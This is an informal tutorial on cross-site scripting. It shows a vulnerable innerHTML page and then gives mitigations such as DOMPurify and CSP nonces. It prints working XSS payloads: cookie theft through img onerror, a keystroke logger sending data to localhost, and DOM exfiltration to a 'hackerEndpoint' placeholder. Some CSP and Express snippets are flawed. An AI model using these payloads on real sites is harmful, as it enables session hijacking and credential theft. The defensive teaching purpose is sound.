
# Cross Site Script Attack


What is XSS?? Suppose you're on some domain or website saurabh.com and someone from outside inject malicious code to do something unintended then you'll get funcked off that is called Cross site script.

Attacker will get access to a lot of your data like cookies, sessionids or credentials if XSS is successful. 

**Vulnerability:**
1. User session hijacking
2. Unauthorised Activities.
3. Capturing keystrokes.
4. Stealing critical Information.
5. Phishing attack.


#### User session Hacking:
<hr>

Simple Example::(Codes)

```js
<script>
    const param=new URLSearchParams(window.location.search);
    const name=param.get('name');
    document.getElementById('username').innerHTML=name
</script>
```

here we are just picking the query params. we are reading the name from q params. How this leads to the issues then???? Lets check. 
along with the same we'll set some cookies simply. (It set from server but for example we are doin it from frontend)

```js
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1 id="username">Hello</h1>
</body>
<script>
    function setCookies(name, value, ttl){
        const d=new Date();
        d.setTime(d.getTime()+(ttl+24*60));
        const expireon="expires "+ d.toUTCString();
        document.cookie=name+"="+value+"::"+expireon;
    }
    setCookies("Cookie name","vookie values",new Date().getDate());
</script>
<script>
    const param=new URLSearchParams(window.location.search);
    const name=param.get('name');
    document.getElementById('username').innerHTML=name
</script>
</html>
```

Now run it with live server.Now while passing the query params ,manupulate the url.

Passing simple query paramaters.
```js
http://127.0.0.1:5500/index.html?name=%22saurabh%22
```

Manupulating the URL:

```
'?name=<img src="does-not-exist" onerror="var img=document.createElement(\'img\'); img.src=\'http://127.0.0.1:5500/cookie?data=\'+ document.cookie; document.querySelector(\'body\').appendChild(img);">'

```
In previous days you can directly add a script to the query params but the browsers can detect it easily so this using image tag is a hack. If src is not exist in img tag it'll run onerror code...try running this code.
And make sure the URL is encoded:

use: encodeURIComponent is the browers api.

```js
encodeURIComponent('?name=<img src="does-not-exist" onerror="var img=document.createElement(\'img\'); img.src=\'http://127.0.0.1:5500/cookie?data=\'+ document.cookie; document.querySelector(\'body\').appendChild(img);">')
```

then pass it as a query param:

```js
localhost:<port>?<encoded uri given above>
```

What does the above url Conclude lets check it out::

```
var img=document.createElement(\'img\');
img.src=\'http://127.0.0.1:5500/cookie?data=\'+ document.cookie;
document.querySelector(\'body\').appendChild(img);

```
we are passing an image tag, Script tags can't be injected nowadays because browsers are pretty secure and smart. So this hack can be done. If src is "does not exist" it'll call onerror, In a script we are creating a dom node of img and setting src as a url which contail document.cookie which is your cookie (Fucked up).so in that endpoint mentioned after the img.src. the request was rend with the cookie data.


**TEST:**
<img width="900" alt="image" src="https://github.com/SaurabhMulay999/FrontEnd-Design/assets/90036775/2a8c7b94-0b36-4409-ad48-cb874c711d89">

<br>

<img width="714" alt="image" src="https://github.com/SaurabhMulay999/FrontEnd-Design/assets/90036775/5f029073-2a93-470e-bdd2-e3f061205568">

**We had tested as above and yes the script was injecting the image tag and exposing the user cookies as well.**

**Lets check more examples:**

#### Unauthorised Activities:
<hr>

Taking unauth access and doing something on behalf of YOU.

```js
<script>
    function Post(title,description){
        var xhr=new XMLHttpRequest();
        xhr.open("POST",'/post',true);
        console.log(document.cookie);
        xhr.withCredentials=true;
        xhr.setRequestHeader(
            "Content-type",
            "application/x-www-form-urlencoded"
        );
        xhr.send(`txtname=${title} & msg=${description}`);
    }
</script>
```

This will goin to create a post request on your own application and just send the request. how this will create a problem??


```js

<script>
    const param=new URLSearchParams(window.location.search);
    const name=param.get('name');
    document.getElementById('username').innerHTML=name;
</script>

```

suppose from query param above we having. suppose i have written a code or query param in such a way that i'll trigger the method post with some title or some params then it'll again thread to the security.

and bro the request is goin on behalf of you so there is no cross origin so function post will be sucessfully getting executed so it will be havoc.

#### Capturing Keystrokes:
<hr>

If maliciously I passed below script as a query param then that script will execute in back and it'll capture each and every keystroke of user.

```js
<script>
    var timeout;
    var buffer="";
    document.querySelector('body').addEventListener('keypress',
    function(event){
        if(event.which!==0){
            clearTimeout(timeout);
            buffer+=String.fromCharCode(event.which);
            timeout=setTimeout(function(){
                var xhr=new XMLHttpRequest();
                var uri='http://localhost:5500/keys?data='+encodeURIComponent(buffer);
                xhr.open('GET',uri);
                xhr.send();
                buffer= '';
            },400)
        }
    })
</script>
```

and everytime user writing something code script will just pick the keystrokes and make a request to uri with the user input /data as a payload. This will potentially pick your credit card number then password and will be direct threat to your security.

### Stealing Critical information:
<hr>
It'll just copy paste your whole DOM and pass it to the hacker.Just add a script and pass it in the query params.Like example:

```js
Passing in Query Params:

<img src="empty.gif" onerror="var mycookie=document.cookie; new Image().src=`http://hackerEndpoint/fpage.php?output=${document.body.innerHTML}`;">
```
This can just able to copy paste every single information from your DOM and send it to the hacker. same as the phishing attack. hacker will inject the user form, suppose a login form so he'll just take you to the fake login form and you'll put the information and malicious script will send your credentials to the hacker and you'll be fucked up.


You can also pass or execute a cool looking form and when user put his credentials just take dom snapshot and pass it to out hacking server or just take critical information to hack the user. 

**Mitigations or things to be care of:**
<hr>

1. List all possible ways to take user inputs. (In form of URL or Mobile number or email like wise).
2. Please do not user innerHtml kind of things, user textContent or innerText. So it won't be execute as a DOM element.
3. Use Escaping. Like escaping script tag or sanitise those tags (possible threats) to some other random strings.
4. Use any lib like React or angular that will take care of all thease things.
5. Do not put Dangerous HTML;s in your DOM.
6. Use libs like DOM purify. it will sanitise the data.
7. Use CSP headers. It control like from which sources and what form of resources can be loaded. It will be conveyed by your server to your browers by csp headers maybe. (But confirm once!!!).


Lets Brief about CSP.

**CSP: (Content security policy)**

Allowed Sources:
You can tell the allowed resources: Whar are allowed sources of script, images, Iframe or forms. So this can be decided by allowed source. (Either cross or same origin).

Script Nounces:
Way to differentiate the script is yours or injected by someone else.

Report-only Mode:
To track the Xss attacks.


**Try to setup the Small Node Server:**

Express Server:

````js

import e from "express";
const app= new e();
console.log(app);
app.listen(3000, function(){
    console.log('server started')
})

````

Sending file/html file as a response:

```js
import e from "express";
const app= new e();
app.get('/', function(req,res)
   res.sendFile(import.meta.dirname+'/index.html');
})
app.listen(3000, function(){
    console.log('server started');
})
```

Here is the html file that we are serving:
````html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sample</title>
    <script src="http://unsecure.com/abc.js"></script>
</head>
<body>
    <h1>server started</h1>
</body>
</html>
````

above you can see I have mentioned a script Tag and I am loading the script from a src/source which is unsecure.com or some unsecure source.

In our case the script has been blocked by browser but many time it'll get executed.!!!So set the CSP headers in the server bro.
<img width="724" alt="image" src="https://github.com/user-attachments/assets/42446401-5613-4394-871d-8accb3c78aea">

Setting the csp headers so blocking 3rd party scripts!!!

It failed to load the script if you set the csp headers and said conten-security-policy to default-src 'self'. mean load the resources from default source only (Maybe in our case it's localhost'

<img width="1725" alt="image" src="https://github.com/user-attachments/assets/d8aaddda-d035-4a46-a189-abeae8b05f14">

Code:
(Use of middleware)

```js
import e from "express";

const app= new e();

app.use(csp);

function csp(req,res,next){
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'"
    )
    next();
}

app.get('/', function(req,res){
    console.log(res);
   res.sendFile(import.meta.dirname+'/index.html');
})


app.listen(3000, function(){
    console.log('server started');
})
```

At script level make it more Flexible:

so you can say "default-src 'self'" + "script-src 'self' 'http:unsecure.com'". So it'll load the script from that domain as well.

```js
function csp(req,res,next){
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self';"+"script-src 'self' 'unsafe-inline' http://unsecure.com;"
    )
    next();
}

```
What if I write inplace script, how i Can execute or allow those??? Use script allow by using "script-src 'unsafe-inline'" this will allow the inline script to run.

So there might be possibility that you are running the inline scripts and maybe some of script got injected in betn  and that is not secure, What should we do or how we could avoid it using CSP headers. We can use nonce.

Let's look at how?

````html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sample</title>
    <script src="http://unsecure.com/abc.js"></script>

    <script nonce="RandomKey">
        console.log('Inline Secure Script');
    </script>
    <script>
        console.log('inLine unsecure script');
    </script>
</head>
<body>
    <h1>server started</h1>
</body>
</html>
````

here we have 2 script tags where 2nd one is not secure, But for our secure inline js we mentioned nonce=<any key> So now that nonce we'll validate using CSP. mentioning "script-tag 'nonce-RandomKey'" will pass the check and execute the inline secure script while blocking the unsecure script.


```
import e from "express";
const app= new e();
app.use(csp);
function csp(req,res,next){
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self';"+"script-src 'self' 'unsafe-inline' 'nonce-RandomKey' http://unsecure.com;"
    )
    next();
}
app.get('/', function(req,res){
    console.log(res);
   res.sendFile(import.meta.dirname+'/index.html');
})
app.listen(3000, function(){
    console.log('server started');
})
```
Check on Browser:

<img width="1314" alt="image" src="https://github.com/user-attachments/assets/02bfbbb2-20c0-4aea-aec6-73f53955fc77">

Yaah it has blocked the unsecire script. report-to or report-uri in the csp headers only work with https.




